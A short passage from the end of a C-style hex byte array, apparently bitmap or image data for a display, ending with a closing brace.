  0x00, 0x00, 0x00, 0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x03, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x03, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
